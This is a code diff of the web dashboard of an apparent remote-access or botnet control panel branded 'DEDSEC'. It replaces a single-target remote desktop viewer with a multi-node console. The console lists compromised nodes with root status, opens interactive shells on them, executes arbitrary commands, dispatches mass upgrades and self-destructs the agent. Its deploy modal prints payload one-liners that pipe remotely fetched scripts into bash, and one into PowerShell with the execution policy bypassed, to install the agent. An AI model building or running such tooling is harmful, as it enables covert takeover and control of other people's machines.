-      '+========================= [ DEDSEC // TELEMETRY & CARRIER RADAR ] =========================+',
-      `| TARGET: {{NODE_ID}} (SLOT #${slotNum}) | CARRIER: ${isNodeOnline ? 'ONLINE ' : 'OFFLINE'} | TIMER: ${elapsed}s | PROTOCOL: ${activeMode.toUpperCase()} |`,
-      '+--------------------------------------------------------------------------------------------+',
-      `| SEQUENCE: ${stepperLine} |`,
-      '+--------------------------------------------------------------------------------------------+',
-      `| >_ ${(logLines[logLines.length-3] || '').padEnd(86, ' ')} |`,
-      `| >_ ${(logLines[logLines.length-2] || '').padEnd(86, ' ')} |`,
-      `| >_ ${(logLines[logLines.length-1] || '').padEnd(86, ' ')} |`,
-      '+============================================================================================+'
-    ];
-
-    const hudH = hud.length;
-    const hudW = hud[0].length;
-    const hudTop = Math.floor(cy - hudH / 2);
-    const hudLeft = Math.floor(cx - hudW / 2);
-
-    const lines = [];
-    const speed = 4.2;
-    const ringDist = 8.0;
-    const bandWidth = 2.4;
-
-    for (let y = 0; y < h; y++) {
-      let row = '';
-      for (let x = 0; x < w; x++) {
-        if (y >= hudTop && y < hudTop + hudH && x >= hudLeft && x < hudLeft + hudW) {
-          row += hud[y - hudTop][x - hudLeft];
-          continue;
-        }
-
-        const dx = (x - cx) * 0.48;
-        const dy = (y - cy);
-        const r = Math.sqrt(dx * dx + dy * dy);
-
-        let dist = (r - radarFrame * speed) % ringDist;
-        if (dist < 0) dist += ringDist;
-
-        if (dist < bandWidth) {
-          const norm = dist / bandWidth;
-          const intensity = 1.0 - Math.abs(norm - 0.5) * 2.0;
-          const idx = Math.floor(intensity * (chars.length - 1));
-          row += chars[Math.max(0, Math.min(chars.length - 1, idx))];
-        } else if (Math.abs((r % ringDist) - bandWidth) < 0.4) {
-          row += ':';
-        } else if ((Math.abs(x - cx) < 0.6 && r > 4) || (Math.abs(y - cy) < 0.6 && r > 2)) {
-          row += '+';
-        } else {
-          row += ' ';
-        }
-      }
-      lines.push(row);
-    }
-
-    radarPre.textContent = lines.join('\n');
-    requestAnimationFrame(renderAsciiRadar);
-  }
-  requestAnimationFrame(renderAsciiRadar);
-
-  // 2. RADAR OVERLAY TOGGLE
-  window.toggleRadarMode = function() {
-    forceRadar = !forceRadar;
-    const btn = document.getElementById('btn-radar-toggle');
-    if (forceRadar) {
-      radarContainer.classList.add('forced-hud');
-      btn.innerText = '[RADAR: ON]';
-      showToast('[+] ASCII RADAR OVERLAY ACTIVATED');
-    } else {
-      radarContainer.classList.remove('forced-hud');
-      btn.innerText = '[RADAR]';
-      showToast('[-] ASCII RADAR OVERLAY HIDDEN');
-    }
-  };
-
-  // 3. SETTINGS MODAL
-  window.openSettings = function() {
-    document.getElementById('settings-modal').style.display = 'flex';
-    document.getElementById('new-admin-pass').focus();
-  };
-  window.closeSettings = function() {
-    document.getElementById('settings-modal').style.display = 'none';
-    viewport.focus();
-  };
-  window.saveAdminPassword = async function() {
-    const p = document.getElementById('new-admin-pass').value.trim();
-    if (!p) { showToast('[!] PASSWORD CANNOT BE EMPTY'); return; }
+  // SOUND FX
+  function playBeep(freq = 600, dur = 0.04) {
+    if (!audioEnabled) return;
     try {
-      const res = await fetch('/api/admin/settings', {
+      if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      const osc = audioCtx.createOscillator();
+      const gain = audioCtx.createGain();
+      osc.type = 'sine';
+      osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+      gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + dur);
+      osc.connect(gain);
+      gain.connect(audioCtx.destination);
+      osc.start();
+      osc.stop(audioCtx.currentTime + dur);
+    } catch(e){}
+  }
+  function toggleAudio() {
+    audioEnabled = !audioEnabled;
+    document.getElementById('audio-toggle-btn').innerText = audioEnabled ? '🔊 AUDIO ON' : '🔇 AUDIO';
+    if(audioEnabled) playBeep(880, 0.08);
+  }
+
+  function toggleScanlines() {
+    const el = document.getElementById('scanlines-el');
+    el.style.display = el.style.display === 'none' ? 'block' : 'none';
+  }
+
+  // DATA REFRESH
+  async function refreshData() {
+    playBeep(900, 0.03);
+    try {
+      const [resNodes, resStats] = await Promise.all([
+        fetch('/api/v1/nodes'),
+        fetch('/api/v1/stats')
+      ]);
+      if (resNodes.ok) {
+        nodes = await resNodes.json();
+        renderNodes();
+      }
+      if (resStats.ok) {
+        const stats = await resStats.json();
+        document.getElementById('h-uptime').innerText = Math.floor(stats.uptime_sec / 3600) + 'h ' + Math.floor((stats.uptime_sec % 3600)/60) + 'm';
+        document.getElementById('h-traffic').innerText = `TX ${(stats.out_bytes / 1024).toFixed(0)} KB / RX ${(stats.in_bytes / 1024).toFixed(0)} KB`;
+      }
+    } catch(err) {
+      console.error(err);
+    }
+  }
+
+  function renderNodes() {
+    const container = document.getElementById('node-list-container');
+    container.innerHTML = '';
+    const search = document.getElementById('search-input').value.toLowerCase();
+    
+    let onlineCount = 0;
+    nodes.forEach(n => {
+      if (n.is_online) onlineCount++;
+    });
+    document.getElementById('h-online-count').innerText = onlineCount;
+    document.getElementById('h-total-count').innerText = nodes.length;
+
+    const filtered = nodes.filter(n => {
+      if (activeFilter === 'online' && !n.is_online) return false;
+      if (activeFilter === 'root' && !n.is_root) return false;
+      if (search && !n.id.toLowerCase().includes(search) && !n.hostname.toLowerCase().includes(search) && !n.ip.toLowerCase().includes(search)) return false;
+      return true;
+    });
+
+    filtered.forEach(n => {
+      const card = document.createElement('div');
+      card.className = 'node-card' + (selectedNode && selectedNode.id === n.id ? ' active' : '');
+      card.onclick = () => selectNode(n);
+      
+      const statusClass = n.is_online ? 'online' : (n.last_seen_sec < 60 ? 'stale' : '');
+      const userBadge = n.is_root ? '<span class="badge-root">root #</span>' : `<span class="badge-user">${n.username || 'user'} $</span>`;
+      
+      card.innerHTML = `
+        <div class="card-top">
+          <div class="card-id-group">
+            <span class="card-slot">#${n.slot || 1}</span>
+            <span class="card-name">${n.hostname || n.id}</span>
+          </div>
+          <div class="status-dot ${statusClass}"></div>
+        </div>
+        <div class="card-mid">
+          <span>${n.ip || '0.0.0.0'}</span>
+          <span>${userBadge}</span>
+          <span>${n.ping_ms || 0}ms</span>
+        </div>
+      `;
+      container.appendChild(card);
+    });
+
+    if (!selectedNode && filtered.length > 0) {
+      selectNode(filtered[0]);
+    }
+  }
+
+  function selectNode(n) {
+    selectedNode = n;
+    playBeep(700, 0.04);
+    document.getElementById('active-target-info').innerText = `TARGET: [${n.hostname || n.id}] (${n.ip}) [SLOT #${n.slot || 1}]`;
+    document.querySelectorAll('.node-card').forEach(c => c.classList.remove('active'));
+    renderNodes();
+    attachTerminal(n.id);
+  }
+
+  function setFilter(f) {
+    activeFilter = f;
+    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+    event.target.classList.add('active');
+    renderNodes();
+  }
+
+  function filterNodes() {
+    renderNodes();
+  }
+
+  // TABS
+  function switchTab(tabId) {
+    playBeep(800, 0.03);
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+    event.target.classList.add('active');
+    document.getElementById(tabId).classList.add('active');
+
+    if (tabId === 'tab-stream' && selectedNode) {
+      const port = selectedNode.webrtc_port || (1984 + (selectedNode.slot || 1) - 1);
+      const vp = document.getElementById('stream-viewport');
+      vp.innerHTML = `<video-stream src="http://${window.location.hostname}:${port}/api/ws?src=desktop_slot_${selectedNode.slot || 1}"></video-stream>`;
+    }
+  }
+
+  // PTY TERMINAL WS
+  function attachTerminal(nodeId) {
+    if (termWS) {
+      termWS.close();
+      termWS = null;
+    }
+    const container = document.getElementById('term-container');
+    container.innerText = `[*] Connecting PTY to node [${nodeId}]...\n`;
+    
+    const wsProto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+    termWS = new WebSocket(`${wsProto}//${window.location.host}/ws/terminal?node=${nodeId}`);
+    
+    termWS.onopen = () => {
+      container.innerText += `[+] PTY WebSocket attached. Interactive terminal ready.\n`;
+    };
+    termWS.onmessage = (e) => {
+      container.innerText += e.data;
+      container.scrollTop = container.scrollHeight;
+    };
+    termWS.onclose = () => {
+      container.innerText += `\n[-] Terminal session closed.`;
+    };
+  }
+
+  function sendTerminalKey(str) {
+    if (termWS && termWS.readyState === WebSocket.OPEN) {
+      termWS.send(str);
+    }
+  }
+
+  function clearTerminal() {
+    document.getElementById('term-container').innerText = '';
+  }
+
+  // TERMINAL KEYBOARD HOOK
+  document.getElementById('term-container').addEventListener('keydown', (e) => {
+    if (!termWS || termWS.readyState !== WebSocket.OPEN) return;
+    if (e.key === 'Backspace') {
+      sendTerminalKey('\x7f');
+      e.preventDefault();
+    } else if (e.key === 'Enter') {
+      sendTerminalKey('\r');
+      e.preventDefault();
+    } else if (e.key === 'ArrowUp') {
+      sendTerminalKey('\x1b[A');
+      e.preventDefault();
+    } else if (e.key === 'ArrowDown') {
+      sendTerminalKey('\x1b[B');
+      e.preventDefault();
+    } else if (e.key.length === 1 && !e.ctrlKey && !e.altKey && !e.metaKey) {
+      sendTerminalKey(e.key);
+      e.preventDefault();
+    }
+  });
+
+  // RPC EXEC
+  async function executeRPC() {
+    if (!selectedNode) return;
+    const cmd = document.getElementById('rpc-cmd').value.trim();
+    if (!cmd) return;
+    playBeep(1000, 0.05);
+    const out = document.getElementById('rpc-output');
+    out.innerText = `[*] Executing: ${cmd} ...\n`;
+    try {
+      const res = await fetch(`/api/v1/nodes/${selectedNode.id}/exec`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ new_password: p })
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({cmd: cmd})
       });
       const data = await res.json();
-      if (data.status === 'ok') {
-        showToast('[+] PASSWORD UPDATED (NC / VNC / WEB)');
-        closeSettings();
-      } else {
-        showToast('[!] UPDATE FAILED');
-      }
-    } catch(e) {
-      showToast('[!] SERVER ERROR');
-    }
-  };
-
-  // 4. TOAST & CLOCK
-  function showToast(text) {
-    toast.innerText = text;
-    toast.style.display = 'block';
-    setTimeout(() => { toast.style.display = 'none'; }, 2000);
-  }
-
-  setInterval(() => {
-    const d = new Date();
-    clockEl.innerText = d.toTimeString().split(' ')[0];
-    const sigFrames = ['SIG: [||||||||]', 'SIG: [|||||||.]', 'SIG: [|||||||||]', 'SIG: [||||||....]'];
-    teleSig.innerText = sigFrames[Math.floor((Date.now() / 350) % sigFrames.length)];
-  }, 350);
-
-  // 5. INPUT WEBSOCKET
-  function connectInput() {
-    const loc = window.location;
-    const proto = (loc.protocol === 'https:') ? 'wss:' : 'ws:';
-    const inputUrl = `${proto}//${loc.host}/ws/input`;
-    inputWS = new WebSocket(inputUrl);
-    inputWS.onclose = () => { setTimeout(connectInput, 2000); };
-  }
-  function sendInput(data) {
-    if (inputWS && inputWS.readyState === WebSocket.OPEN) {
-      inputWS.send(JSON.stringify(data));
+      out.innerText = data.output || JSON.stringify(data, null, 2);
+    } catch(err) {
+      out.innerText = `[-] Error: ${err.message}`;
     }
   }
 
-  // 6. MODIFIERS & VIRTUAL KEYBOARD INJECTION
-  const activeModifiers = {
-    Control: false,
-    Alt: false,
-    Shift: false,
-    Meta: false
-  };
-
-  window.toggleModifier = function(mod) {
-    activeModifiers[mod] = !activeModifiers[mod];
-    const btnMap = {
-      Control: 'k-ctrl',
-      Alt: 'k-alt',
-      Shift: 'k-shift',
-      Meta: 'k-super'
-    };
-    const btn = document.getElementById(btnMap[mod]);
-    if (btn) {
-      if (activeModifiers[mod]) {
-        btn.classList.add('locked');
-        sendInput({ type: 'keydown', key: mod, code: mod + 'Left' });
-        showToast(`[+] ${mod.toUpperCase()} LOCKED DOWN`);
-      } else {
-        btn.classList.remove('locked');
-        sendInput({ type: 'keyup', key: mod, code: mod + 'Left' });
-        showToast(`[-] ${mod.toUpperCase()} RELEASED`);
-      }
-    }
-    viewport.focus();
-  };
-
-  window.sendSingleKey = function(key, code) {
-    if (!inputEnabled) { showToast('[!] INPUT IS OFF [PgDn]'); return; }
-    sendInput({ type: 'keydown', key: key, code: code });
-    setTimeout(() => {
-      sendInput({ type: 'keyup', key: key, code: code });
-    }, 40);
-    showToast(`[*] KEY: ${key.toUpperCase()}`);
-    viewport.focus();
-  };
-
-  window.sendKeyCombo = function(keys) {
-    if (!inputEnabled) { showToast('[!] INPUT IS OFF [PgDn]'); return; }
-    keys.forEach(k => {
-      sendInput({ type: 'keydown', key: k, code: k });
-    });
-    setTimeout(() => {
-      keys.slice().reverse().forEach(k => {
-        sendInput({ type: 'keyup', key: k, code: k });
-      });
-    }, 80);
-    showToast(`[*] COMBO: ${keys.join(' + ').toUpperCase()}`);
-    viewport.focus();
-  };
-
-  // 7. INPUT INTERCEPTOR (PgDn)
-  window.toggleInputCapture = function() {
-    inputEnabled = !inputEnabled;
-    const btn = document.getElementById('btn-toggle-input');
-    if (inputEnabled) {
-      if (btn) {
-        btn.innerHTML = '[● INPUT: ON] PgDn';
-        btn.className = 'active-toggle';
-      }
-      viewport.style.cursor = 'crosshair';
-      showToast('[+] INPUT CAPTURE ENABLED [PgDn]');
-    } else {
-      if (btn) {
-        btn.innerHTML = '[x INPUT: OFF] PgDn';
-        btn.className = '';
-      }
-      viewport.style.cursor = 'not-allowed';
-      showToast('[-] INPUT CAPTURE LOCKED [PgDn]');
-    }
-  };
-
-  // 8. VIDEO PLAYER & RESOLUTION STATUS
-  let nodeNativeW = 0, nodeNativeH = 0;
-
-  function updateResolutionBadge() {
-    const v = currentVideoStream ? currentVideoStream.querySelector('video') : null;
-    const streamW = (v && v.videoWidth > 0) ? v.videoWidth : 0;
-    const streamH = (v && v.videoHeight > 0) ? v.videoHeight : 0;
-
-    let text = 'RES: -';
-    if (nodeNativeW > 0 && nodeNativeH > 0) {
-      if (streamW > 0 && (streamW !== nodeNativeW || streamH !== nodeNativeH)) {
-        text = `RES: ${nodeNativeW}x${nodeNativeH} [${streamW}x${streamH}]`;
-      } else {
-        text = `RES: ${nodeNativeW}x${nodeNativeH}`;
-      }
-    } else if (streamW > 0) {
-      text = `RES: ${streamW}x${streamH}`;
-    }
-    resVal.innerText = text;
-  }
-
-  function initPlayer() {
-    connectStartTs = Date.now();
-    connStep = isNodeOnline ? 2 : 1;
-    addLog('INIT', `STARTING WEBRTC PIPELINE FOR ${streamSrc}`);
-
-    if (currentVideoStream) {
-      currentVideoStream.remove();
-      currentVideoStream = null;
-    }
-
-    if (!isNodeOnline) {
-      addLog('POLL', 'AWAITING NODE AGENT SIGNAL ON UDP');
-      codecBadge.innerText = '[OFFLINE]';
-      statusBox.classList.remove('online');
-      startOnlinePoller();
-      return;
-    }
-
-    connStep = 3;
-    addLog('SDP', 'EXCHANGING SDP OFFER / ANSWER WITH GO2RTC');
-
-    const videoStream = document.createElement('video-stream');
-    videoStream.background = true;
-    videoStream.mode = activeMode;
-    videoStream.src = new URL('/api/ws?src=' + encodeURIComponent(streamSrc), window.location.href);
-    viewport.appendChild(videoStream);
-    currentVideoStream = videoStream;
-
-    codecBadge.innerText = '[NEGOTIATING]';
-
-    const pollInterval = setInterval(() => {
-      if (!currentVideoStream || currentVideoStream !== videoStream) {
-        clearInterval(pollInterval);
-        return;
-      }
-
-      const v = videoStream.querySelector('video');
-      if (v) {
-        v.muted = true;
-        v.autoplay = true;
-        v.playsInline = true;
-        v.controls = false;
-        v.style.pointerEvents = 'none';
-
-        if (v.videoWidth > 0) {
-          updateResolutionBadge();
-          connStep = 5;
-          radarContainer.classList.add('active-video');
-        }
-      }
-
-      const modeEl = videoStream.querySelector('.mode');
-      if (modeEl && modeEl.innerText) {
-        const m = modeEl.innerText.toUpperCase();
-        if (m === 'RTC') {
-          connStep = 5;
-          codecBadge.innerText = '[ONLINE: RTC 0ms]';
-          statusBox.classList.add('online');
-        } else if (m === 'MSE') {
-          connStep = 5;
-          codecBadge.innerText = '[ONLINE: MSE]';
-          statusBox.classList.add('online');
-        }
-      }
-    }, 200);
-  }
-
-  async function fetchStreamStatus() {
+  // NODE MAINTENANCE
+  async function pingTarget() {
+    if (!selectedNode) return;
+    const out = document.getElementById('ops-output');
+    out.innerText = `[*] Sending latency probe to [${selectedNode.id}]...\n`;
+    const t0 = performance.now();
     try {
-      const resp = await fetch('/api/stream/status');
-      if (resp.ok) {
-        const d = await resp.json();
-        if (d.width > 0 && d.height > 0) {
-          nodeNativeW = d.width;
-          nodeNativeH = d.height;
-          updateResolutionBadge();
-        }
-        if (d.is_online && !isNodeOnline) {
-          isNodeOnline = true;
-          connStep = 2;
-          addLog('OK', 'NODE AGENT DETECTED ONLINE');
-          showToast('[+] CARRIER SIGNAL DETECTED');
-          initPlayer();
-          connectInput();
-        } else if (!d.is_online && isNodeOnline) {
-          isNodeOnline = false;
-          codecBadge.innerText = '[OFFLINE]';
-          statusBox.classList.remove('online');
-        }
-      }
-    } catch(e) {}
-  }
-
-  setInterval(fetchStreamStatus, 3000);
-  fetchStreamStatus();
-
-  let statusPoller = null;
-  function startOnlinePoller() {
-    if (statusPoller) return;
-    statusPoller = setInterval(fetchStreamStatus, 2000);
-  }
-
-  window.reconnect = function() {
-    radarContainer.classList.remove('active-video');
-    showToast('[*] RECONNECTING...');
-    initPlayer();
-  };
-
-  window.changeMode = function(m) {
-    activeMode = m;
-    initPlayer();
-  };
-
-  window.applyQualitySettings = async function() {
-    const scale = parseFloat(document.getElementById('sel-scale').value);
-    const fps = parseInt(document.getElementById('sel-fps').value, 10);
-    const bitrate = parseInt(document.getElementById('sel-bitrate').value, 10);
-    const preset = parseInt(document.getElementById('sel-preset').value, 10);
-
-    showToast('[*] APPLYING PARAMS...');
-    try {
-      const resp = await fetch('/api/stream/config', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ scale, fps, bitrate, preset })
-      });
-      const data = await resp.json();
-      if (data.status === 'ok') {
-        showToast(`[+] APPLIED: ${fps} FPS | ${bitrate} kbps`);
-      } else {
-        showToast('[!] CONFIG FAILED');
-      }
+      await fetch(`/api/v1/nodes/${selectedNode.id}/ping`, {method: 'POST'});
+      const dt = (performance.now() - t0).toFixed(1);
+      out.innerText += `[+] Pong received in ${dt} ms.`;
     } catch(e) {
-      showToast('[!] ERROR');
+      out.innerText += `[-] Ping failed: ${e.message}`;
     }
-  };
-
-  window.toggleFullscreen = function() {
-    if (!document.fullscreenElement) {
-      viewport.requestFullscreen().catch(err => alert(err.message));
-    } else {
-      document.exitFullscreen();
-    }
-  };
-
-  window.uploadFiles = async function(files) {
-    if (!files || files.length === 0) return;
-    for (const file of files) {
-      showToast(`[*] UPLOADING ${file.name}...`);
-      const fd = new FormData();
-      fd.append('file', file);
-      try {
-        const resp = await fetch('/upload', { method: 'POST', body: fd });
-        if (resp.ok) {
-          showToast(`[+] ${file.name} SAVED`);
-        } else {
-          showToast(`[!] ERROR ${file.name}`);
-        }
-      } catch(err) {
-        showToast(`[!] TRANSFER ERROR`);
-      }
-    }
-  };
-
-  // 9. ACCURATE PROPORTIONAL MOUSE & TOUCH COORDINATES
-  function getActiveCoords(e) {
-    const clientX = (e.touches && e.touches.length > 0) ? e.touches[0].clientX : (e.changedTouches && e.changedTouches.length > 0 ? e.changedTouches[0].clientX : e.clientX);
-    const clientY = (e.touches && e.touches.length > 0) ? e.touches[0].clientY : (e.changedTouches && e.changedTouches.length > 0 ? e.changedTouches[0].clientY : e.clientY);
-
-    const v = currentVideoStream ? currentVideoStream.querySelector('video') : null;
-    if (!v || !v.videoWidth || !v.videoHeight) {
-      const rect = viewport.getBoundingClientRect();
-      const normX = Math.max(0, Math.min(1.0, (clientX - rect.left) / (rect.width || 1)));
-      const normY = Math.max(0, Math.min(1.0, (clientY - rect.top) / (rect.height || 1)));
-      return { x: Math.round(normX * 1920), y: Math.round(normY * 1080), normX, normY };
-    }
-
-    const rect = v.getBoundingClientRect();
-    if (!rect.width || !rect.height) return { x: 0, y: 0, normX: 0, normY: 0 };
-
-    const videoRatio = v.videoWidth / v.videoHeight;
-    const elemRatio = rect.width / rect.height;
-    let renderW = rect.width, renderH = rect.height;
-    let renderX = 0, renderY = 0;
-
-    if (elemRatio > videoRatio) {
-      renderW = rect.height * videoRatio;
-      renderX = (rect.width - renderW) / 2;
-    } else {
-      renderH = rect.width / videoRatio;
-      renderY = (rect.height - renderH) / 2;
-    }
-
-    const mouseX = clientX - rect.left;
-    const mouseY = clientY - rect.top;
-    const activeX = Math.max(0, Math.min(renderW, mouseX - renderX));
-    const activeY = Math.max(0, Math.min(renderH, mouseY - renderY));
-    const normX = Math.max(0, Math.min(1.0, activeX / (renderW || 1)));
-    const normY = Math.max(0, Math.min(1.0, activeY / (renderH || 1)));
-
-    return {
-      x: Math.round(normX * 65535),
-      y: Math.round(normY * 65535),
-      normX, normY
-    };
   }
 
-  viewport.addEventListener('mousemove', (e) => {
-    if (!inputEnabled) return;
-    const { x, y, normX, normY } = getActiveCoords(e);
-    sendInput({ type: 'mousemove', x, y, normX, normY });
-  });
-
-  viewport.addEventListener('mousedown', (e) => {
-    viewport.focus();
-    if (!inputEnabled) return;
-    const { x, y, normX, normY } = getActiveCoords(e);
-    sendInput({ type: 'mousedown', button: e.button, x, y, normX, normY });
-  });
-
-  viewport.addEventListener('mouseup', (e) => {
-    if (!inputEnabled) return;
-    const { x, y, normX, normY } = getActiveCoords(e);
-    sendInput({ type: 'mouseup', button: e.button, x, y, normX, normY });
-  });
-
-  viewport.addEventListener('contextmenu', (e) => { e.preventDefault(); });
-
-  viewport.addEventListener('wheel', (e) => {
-    if (!inputEnabled) return;
-    const { x, y, normX, normY } = getActiveCoords(e);
-    sendInput({ type: 'wheel', deltaY: e.deltaY > 0 ? 1 : -1, x, y, normX, normY });
-  }, { passive: true });
-
-  // Mobile touch event listeners (Tap to click, Drag to move cursor)
-  let isTouching = false;
-
-  viewport.addEventListener('touchstart', (e) => {
-    if (!inputEnabled) return;
-    isTouching = true;
-    const coords = getActiveCoords(e);
-    sendInput({ type: 'mousemove', ...coords });
-    sendInput({ type: 'mousedown', button: 0, ...coords });
-    e.preventDefault();
-  }, { passive: false });
-
-  viewport.addEventListener('touchmove', (e) => {
-    if (!inputEnabled || !isTouching) return;
-    const coords = getActiveCoords(e);
-    sendInput({ type: 'mousemove', ...coords });
-    e.preventDefault();
-  }, { passive: false });
-
-  viewport.addEventListener('touchend', (e) => {
-    if (!inputEnabled) return;
-    isTouching = false;
-    const coords = getActiveCoords(e);
-    sendInput({ type: 'mouseup', button: 0, ...coords });
-    e.preventDefault();
-  }, { passive: false });
-
-  viewport.addEventListener('touchcancel', (e) => {
-    if (!inputEnabled) return;
-    isTouching = false;
-    const coords = getActiveCoords(e);
-    sendInput({ type: 'mouseup', button: 0, ...coords });
-  });
-
-  // 10. FULL KEYBOARD CAPTURE
-  window.addEventListener('keydown', (e) => {
-    if (document.getElementById('settings-modal').style.display === 'flex') {
-      if (e.key === 'Escape') closeSettings();
-      return;
+  async function updateTarget() {
+    if (!selectedNode) return;
+    const out = document.getElementById('ops-output');
+    out.innerText = `[*] Dispatched remote self-upgrade for [${selectedNode.id}]...\n`;
+    try {
+      const res = await fetch(`/api/v1/nodes/${selectedNode.id}/update`, {method: 'POST'});
+      const data = await res.text();
+      out.innerText += data;
+    } catch(e) {
+      out.innerText += `[-] Update failed: ${e.message}`;
     }
-    if (e.code === 'PageDown' || e.key === 'PageDown') {
-      e.preventDefault();
-      toggleInputCapture();
-      return;
+  }
+
+  async function updateAllNodes() {
+    if (!confirm('Broadcast remote upgrade to ALL online nodes?')) return;
+    try {
+      const res = await fetch('/api/v1/nodes/update_all', {method: 'POST'});
+      const data = await res.json();
+      alert(`Mass upgrade dispatched: ${JSON.stringify(data)}`);
+    } catch(e) {
+      alert(`Error: ${e.message}`);
     }
-    if (!inputEnabled) return;
-    if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
+  }
 
-    sendInput({ type: 'keydown', key: e.key, code: e.code });
-
-    if (['Tab', 'Alt', 'Meta', 'ContextMenu', 'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12', 'Backspace', 'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'Space', ' ', 'Delete', 'Insert', 'Home', 'End', 'PageUp'].includes(e.key) || (e.ctrlKey && ['w','r','t','n','s','a','c','v','x','z','p','f'].includes(e.key.toLowerCase())) || e.altKey) {
-      e.preventDefault();
+  async function uninstallTarget() {
+    if (!selectedNode) return;
+    if (!confirm(`Self-destruct and wipe agent on [${selectedNode.id}]?`)) return;
+    try {
+      await fetch(`/api/v1/nodes/${selectedNode.id}/uninstall`, {method: 'POST'});
+      alert(`Uninstall dispatched on node ${selectedNode.id}`);
+      refreshData();
+    } catch(e) {
+      alert(`Uninstall error: ${e.message}`);
     }
-  }, { capture: true });
+  }
 
-  window.addEventListener('keyup', (e) => {
-    if (document.getElementById('settings-modal').style.display === 'flex') return;
-    if (e.code === 'PageDown' || e.key === 'PageDown') {
-      e.preventDefault();
-      return;
+  // DEPLOY MODAL
+  function openDeployModal() {
+    playBeep(900, 0.04);
+    const host = window.location.host;
+    document.getElementById('snip-agent').innerText = `curl -s http://${host}/i | bash`;
+    document.getElementById('snip-m4r').innerText = `curl -s http://${host}/m4r | bash`;
+    document.getElementById('snip-win').innerText = `powershell -ep bypass -c "iwr -useb http://${host}/m4r.ps1 | iex"`;
+    document.getElementById('deploy-modal').classList.add('open');
+  }
+  function closeDeployModal() {
+    document.getElementById('deploy-modal').classList.remove('open');
+  }
+
+  // MATRIX / CYBER BACKGROUND CANVAS
+  const canvas = document.getElementById('bg-canvas');
+  const ctx = canvas.getContext('2d');
+  let width, height;
+  function resizeCanvas() {
+    width = canvas.width = window.innerWidth;
+    height = canvas.height = window.innerHeight;
+  }
+  window.addEventListener('resize', resizeCanvas);
+  resizeCanvas();
+
+  const cols = Math.floor(window.innerWidth / 20);
+  const drops = Array(cols).fill(1);
+  function drawCanvas() {
+    ctx.fillStyle = 'rgba(6, 9, 14, 0.1)';
+    ctx.fillRect(0, 0, width, height);
+    ctx.fillStyle = '#00ff88';
+    ctx.font = '12px monospace';
+    for (let i = 0; i < drops.length; i++) {
+      const char = String.fromCharCode(33 + Math.floor(Math.random() * 94));
+      ctx.fillText(char, i * 20, drops[i] * 20);
+      if (drops[i] * 20 > height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
     }
-    if (!inputEnabled) return;
-    if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
+    requestAnimationFrame(drawCanvas);
+  }
+  drawCanvas();
 
-    sendInput({ type: 'keyup', key: e.key, code: e.code });
-
-    if (['Tab', 'Alt', 'Meta'].includes(e.key) || e.altKey) {
-      e.preventDefault();
-    }
-  }, { capture: true });
-
-  // Prevent buttons from retaining focus and stealing keyboard events
-  document.querySelectorAll('button').forEach(btn => {
-    btn.addEventListener('mouseup', () => {
-      btn.blur();
-      viewport.focus();
-    });
-  });
-
-  viewport.addEventListener('click', () => viewport.focus());
-
-  connectInput();
-  initPlayer();
+  // INIT
+  refreshData();
+  setInterval(refreshData, 3000);
 </script>
 </body>
 </html>
